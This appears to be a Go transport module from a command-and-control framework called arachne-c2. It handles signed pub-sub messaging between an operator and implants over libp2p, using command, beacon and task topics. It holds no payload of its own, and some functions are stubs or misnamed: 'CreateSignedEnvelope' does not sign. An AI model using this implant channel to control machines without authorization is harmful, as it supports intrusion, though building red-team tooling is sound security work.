package transport

import (
	"context"
	"fmt"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/libp2p/go-libp2p/core/crypto"

	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
	"github.com/anomalyco/arachne-c2/pkg/cryptography"
)

type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, from []byte)

type Messenger struct {
	node    *Node
	handler MessageHandler
	privKey crypto.PrivKey
	mu      sync.RWMutex
}

func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
	return &Messenger{
		node:    node,
		privKey: keys.PrivateKey,
	}
}

func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey) *Messenger {
	return &Messenger{
		node:    node,
		privKey: keys.PrivateKey,
	}
}

func (m *Messenger) SetHandler(handler MessageHandler) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.handler = handler
}

func (m *Messenger) CommandTopic() string {
	return CommandTopicPrefix + m.node.ID().String()
}

func (m *Messenger) BeaconTopic() string {
	return BeaconTopicPrefix + m.node.ID().String()
}

func (m *Messenger) TaskTopic(implantPeerID string) string {
	return TaskTopicPrefix + implantPeerID
}

func (m *Messenger) ListenBeacons(ctx context.Context) error {
	topic := m.BeaconTopic()
	sub, err := m.node.Subscribe(topic)
	if err != nil {
		return fmt.Errorf("subscribe beacons: %w", err)
	}
	go func() {
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				return
			}
			env := &arachnepb.Envelope{}
			if err := proto.Unmarshal(msg.Data, env); err != nil {
				continue
			}
			m.mu.RLock()
			handler := m.handler
			m.mu.RUnlock()
			if handler != nil {
				handler(ctx, env, msg.From)
			}
		}
	}()
	return nil
}

func (m *Messenger) ListenCommands(ctx context.Context) error {
	topic := m.CommandTopic()
	sub, err := m.node.Subscribe(topic)
	if err != nil {
		return fmt.Errorf("subscribe commands: %w", err)
	}
	go func() {
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				return
			}
			env := &arachnepb.Envelope{}
			if err := proto.Unmarshal(msg.Data, env); err != nil {
				continue
			}
			m.mu.RLock()
			handler := m.handler
			m.mu.RUnlock()
			if handler != nil {
				handler(ctx, env, msg.From)
			}
		}
	}()
	return nil
}

func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	data, err := proto.Marshal(env)
	if err != nil {
		return fmt.Errorf("marshal envelope: %w", err)
	}
	return m.node.Publish(ctx, topic, data)
}

func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	if m.privKey != nil {
		sig, err := cryptography.Sign(m.privKey, env.Data)
		if err != nil {
			return fmt.Errorf("sign: %w", err)
		}
		env.Signature = sig

		pubBytes, err := m.privKey.GetPublic().Raw()
		if err == nil {
			env.SenderKey = pubBytes
		}
	}
	return m.SendEnvelope(ctx, topic, env)
}

func (m *Messenger) SendDirectStream(ctx context.Context, peerID string, env *arachnepb.Envelope) error {
	return nil
}

func (m *Messenger) CreateSignedEnvelope(msgType uint32, data []byte) *arachnepb.Envelope {
	env := &arachnepb.Envelope{
		ID:   time.Now().UnixNano(),
		Type: msgType,
		Data: data,
	}
	return env
}
